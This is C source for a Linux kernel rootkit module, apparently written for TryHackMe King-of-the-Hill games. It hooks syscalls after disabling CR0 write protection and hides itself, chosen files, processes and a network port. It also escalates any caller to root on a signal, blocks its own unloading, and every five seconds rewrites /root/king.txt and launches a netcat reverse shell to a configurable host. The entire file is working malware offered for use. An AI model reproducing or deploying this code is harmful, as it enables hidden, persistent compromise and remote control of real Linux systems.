#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/kallsyms.h>
#include <linux/syscalls.h>
#include <linux/unistd.h>
#include <linux/version.h>
#include <linux/dirent.h>
#include <asm/paravirt.h>
#include <linux/cred.h>
#include <linux/list.h>
#include <linux/workqueue.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/delay.h>
#include <linux/kthread.h>
#include <linux/net.h>
#include <linux/in.h>
#include <linux/socket.h>
#include <net/sock.h>
#include <linux/string.h>
#include <linux/seq_file.h>

#define PREFIX "vlr"

#define KING_NAME "USERNAME\n" // replace with your thm username
#define KING_PATH "/root/king.txt"
#define CHECK_INTERVAL (5 * HZ)
#define REV_SHELL_INTERVAL (5 * HZ)

/* MODULE INFO */
MODULE_LICENSE("GPL");
MODULE_AUTHOR("0x76OID (Void)");
MODULE_DESCRIPTION("LKM RKT");
MODULE_VERSION("0.6.10");

unsigned long *__sys_call_table = NULL;
static short hide_proc = 0;
static short hide_dirs = 1;
static short protected = 1;
char hide_pid[NAME_MAX];

static struct list_head *prev_module;

static struct workqueue_struct *king_wq;
static struct workqueue_struct *rev_shell_wq;
static struct delayed_work king_check;
static struct delayed_work rev_shell_work;

typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
static ptregs_t orig_kill;
static ptregs_t orig_getdents64;
static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);

enum signals{
    ROOTSIG = 4,
    HIDE_UNHIDE_SIG = 14,
    HIDE_UNHIDE_DIRS_SIG = 24,
    HIDE_PROC = 34,
    PROTECT_UNPROTECT = 44
};

struct linux_dirent{
    unsigned long d_ino;
    unsigned long d_off;
    unsigned short d_reclen;
    char d_name[];
};

/* Get SysCall table function */
static unsigned long *get_syscall_table(void){
    unsigned long *syscall_table = NULL;
#if LINUX_VERSION_CODE > KERNEL_VERSION(4,4,0)
    syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
#else
    unsigned long int i;
    for(i = (unsigned long int)sys_close ; i < ULONG_MAX ; i+=sizeof(void *)){
        syscall_table = (unsigned long*) i;
        if(syscall_table[__NR_close] ==  (unsigned long )sys_close){
            return syscall_table;
        }
    }
#endif
    return syscall_table;
}

static int store(void){
    /* Store original syscalls */
    orig_kill = (ptregs_t)__sys_call_table[__NR_kill];
    orig_getdents64 = (ptregs_t)__sys_call_table[__NR_getdents64];
    orig_tcp4_seq_show = (long (*)(struct seq_file *, void *))kallsyms_lookup_name("tcp4_seq_show");    
    return 0;
}

static void vlr_hide(void){
    prev_module = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
}

static void vlr_unhide(void){
    list_add(&THIS_MODULE->list, prev_module);
}

static void vlr_root(void){
    struct cred *new_cred = prepare_kernel_cred(NULL);
    if(new_cred != NULL) {
        new_cred->uid.val = 0;
        new_cred->gid.val = 0;
        new_cred->euid.val = 0;
        new_cred->egid.val = 0;
        commit_creds(new_cred);
    }
}


static void vlr_protect(void){
    try_module_get(THIS_MODULE);
}

static void vlr_unprotect(void){
    module_put(THIS_MODULE);
}

static asmlinkage long kill_hack(const struct pt_regs *regs){
    pid_t pid = regs->di;
    int sig = regs->si;
    static short hide = 1;

    if(sig == HIDE_UNHIDE_SIG && hide == 0){
        vlr_hide();
        hide = 1;
    }else if(sig == HIDE_UNHIDE_SIG && hide == 1){
        vlr_unhide();
        hide = 0;
    }else if(sig == HIDE_PROC && hide_proc == 0){
        sprintf(hide_pid, "%d", pid);
        hide_proc = 1;
    }else if(sig == HIDE_PROC && hide_proc == 1){
        memset(hide_pid, 0, sizeof(hide_pid));
        hide_proc = 0;
    }else if(sig == ROOTSIG){
        vlr_root();
    }else if(sig == HIDE_UNHIDE_DIRS_SIG){
        hide_dirs = !hide_dirs;
    }else if(sig == PROTECT_UNPROTECT && protected == 0){
        vlr_protect();
        protected = 1;
    }else if(sig == PROTECT_UNPROTECT && protected == 1){
        vlr_unprotect();
        protected = 0;
    }else{
        return orig_kill(regs);
    }

    return 0;
}

static asmlinkage long getdents64_hack(const struct pt_regs *regs){
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 *)regs->si;
    struct linux_dirent64 *previous_dir, *current_dir, *dirent_ker = NULL;

    unsigned long offset = 0;
    int ret = orig_getdents64(regs);
    long error;
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if((ret <= 0) || (dirent_ker == NULL)){
        return ret;
    }

    error = copy_from_user(dirent_ker, dirent, ret);
    if(error){
        goto done;
    }

    while(offset < ret){
        current_dir = (void *)dirent_ker + offset;

        if(hide_proc && (memcmp(hide_pid, current_dir->d_name, strlen(hide_pid)) == 0) &&
            (strncmp(hide_pid, "", NAME_MAX) != 0)){
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }else if(hide_dirs && memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0){
            if(current_dir == dirent_ker){
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }
            previous_dir->d_reclen += current_dir->d_reclen;
        }else{
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if(error){
        goto done;
    }

done:
    kfree(dirent_ker);
    return ret;
}

static void king_hack(struct work_struct *work){
    struct file *file;
    mm_segment_t old_fs;
    loff_t pos = 0;
    int len = strlen(KING_NAME);

    old_fs = get_fs();
    set_fs(KERNEL_DS);

    file = filp_open(KING_PATH, O_RDWR | O_CREAT | O_TRUNC, 0644);
    if(IS_ERR(file)){
        set_fs(old_fs);
        goto reschedule;
    }
    pos = 0;
    kernel_write(file, KING_NAME, len, &pos);

    filp_close(file, NULL);
    set_fs(old_fs);

reschedule:
    queue_delayed_work(king_wq, &king_check, CHECK_INTERVAL);
}

static int vlr_rev(void){
    char *envp[] = {
        "HOME=/root",
        "TERM=xterm",
        "REV_TCP_LH=10.10.10.10", // replace with your IP
        "REV_TCP_LP=1309", // replace with any port
        NULL
    };

    char *argv[] = {
        "/bin/bash",
        "-c",
        "/usr/bin/rm /tmp/pinkit;/usr/bin/mkfifo /tmp/pinkit;/usr/bin/cat /tmp/pinkit|/bin/sh -i 2>&1|/usr/bin/nc $REV_TCP_LH $REV_TCP_LP >/tmp/pinkit",
        NULL
    };

    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);

    return 0;
}

static void vlr_startrev(struct work_struct *work) {
    vlr_rev();
    queue_delayed_work(rev_shell_wq, &rev_shell_work, REV_SHELL_INTERVAL);
}


static asmlinkage long tcp4_seq_show_hack(struct seq_file *seq, void *v) {
    
    struct sock *sk = v;

    if (!orig_tcp4_seq_show)
        return -EINVAL;

    if (sk == NULL)
        return orig_tcp4_seq_show(seq, v);
        
    if(sk->sk_num == 0x51d)
        return 0;
    
    return orig_tcp4_seq_show(seq, v);
}


static int vlr_clean(void){
    /* Unhook syscalls */
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;
    __sys_call_table[__NR_getdents64] = (unsigned long)orig_getdents64;
    *((long *)kallsyms_lookup_name("tcp4_seq_show")) = (unsigned long)orig_tcp4_seq_show;
    
    if(king_wq){
        cancel_delayed_work_sync(&king_check);
        destroy_workqueue(king_wq);
    }

    if(rev_shell_wq){
        cancel_delayed_work_sync(&rev_shell_work);
        destroy_workqueue(rev_shell_wq);
    }
    
    return 0;
}

static int hook(void){
    /* Hooking syscalls */
    __sys_call_table[__NR_kill] = (unsigned long)&kill_hack;
    __sys_call_table[__NR_getdents64] = (unsigned long)&getdents64_hack;
    *((long *)kallsyms_lookup_name("tcp4_seq_show")) = (unsigned long)tcp4_seq_show_hack;

    return 0;
}

/* Force write CR0 */
static inline void write_cr0_forced(unsigned long val){
    unsigned long __force_order;
    asm volatile("mov %0, %%cr0" : "+r"(val), "+m"(__force_order));
}

/* Enable memory protection */
static inline void protect_memory(void){
    write_cr0_forced(read_cr0());
}

/* Disable memory protection */
static inline void unprotect_memory(void){
    write_cr0_forced(read_cr0() & ~0x00010000);
}

/* Init function */
static int __init vlr_init(void){
    __sys_call_table = get_syscall_table();

    store();
    unprotect_memory();
    hook();
    vlr_hide();
    vlr_protect();
    protect_memory();

    king_wq = create_workqueue("king_wq");
    if(!king_wq)
        return -ENOMEM;
    
    rev_shell_wq = create_workqueue("rev_shell_wq");
    if(!rev_shell_wq){
        destroy_workqueue(king_wq);
        return -ENOMEM;
    }

    INIT_DELAYED_WORK(&king_check, king_hack);
    INIT_DELAYED_WORK(&rev_shell_work, vlr_startrev);

    queue_delayed_work(king_wq, &king_check, CHECK_INTERVAL);
    queue_delayed_work(rev_shell_wq, &rev_shell_work, REV_SHELL_INTERVAL);

    return 0;
}

/* Exit function */
static void __exit vlr_exit(void){
    unprotect_memory();
    vlr_clean();
    protect_memory();
}

module_init(vlr_init);
module_exit(vlr_exit);